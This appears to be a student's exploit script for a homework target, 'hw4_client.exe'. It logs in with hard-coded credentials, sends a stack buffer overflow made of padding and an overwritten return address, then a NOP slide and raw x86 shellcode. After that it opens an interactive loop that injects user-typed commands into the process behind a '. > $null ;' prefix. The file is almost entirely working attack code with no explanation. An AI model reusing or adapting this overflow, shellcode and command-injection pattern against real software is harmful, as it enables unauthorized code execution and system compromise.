from subprocess import Popen, PIPE

if __name__ == '__main__':

    login = b"archer\n2BBVAFEX2RNFB2NF\nPEEK\n"

    overflow = b"\x00"+b"a"*16303+b"\x28\x20\x50\x62"
    vulnerability_abuse = login + overflow


    slide = b"\xEB\x15\xCA\xFE\xE8\xDC\x5F\x00\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"


    package = b"\x81\xEC\x00\x40\x00\x00\x89\xE7\x57\x68\x68\x61\x50\x62\xB8\xD4\x4B\x50\x62\xFF\xD0\x6A\x00\x68\x80\x80\x50\x62\x57\x6A\x07\xB8\x90\xFD\x5F\x00\xFF\x30\xB8\x92\x18\x50\x62\xFF\xD0\x83\xC4\x1C\xEB\xD4"


    p = Popen(["hw4_client.exe"], stdin=PIPE, )
    p.stdin.write(vulnerability_abuse + slide + package + b"\n")
    p.stdin.flush()
    usr_input = ""
    while usr_input != "exit":
        usr_input = input()
        cmd = ". > $null ; " + usr_input
        p.stdin.write(bytearray((cmd + "\n").encode()))
        p.stdin.flush()
    p.kill()